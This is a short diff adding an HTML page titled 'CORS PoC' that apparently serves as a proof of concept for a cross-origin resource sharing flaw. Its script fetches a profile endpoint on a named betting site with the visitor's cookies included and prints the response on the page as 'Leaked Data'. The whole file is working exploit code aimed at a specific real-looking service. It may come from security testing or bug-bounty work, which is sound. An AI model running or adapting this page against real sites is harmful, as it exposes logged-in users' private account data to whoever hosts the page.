@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC</title>
+</head>
+<body>
+<h2>CORS PoC Test</h2>
+
+<script>
+fetch("https://1win.com/betwave/backend/profile", {
+  credentials: "include"
+})
+.then(response => response.text())
+.then(data => {
+  document.body.innerHTML += "<h3>Leaked Data:</h3><pre>" + data + "</pre>";
+  console.log("LEAK:", data);
+})
+.catch(error => console.error("Error:", error));
+</script>
+
+</body>
+</html>
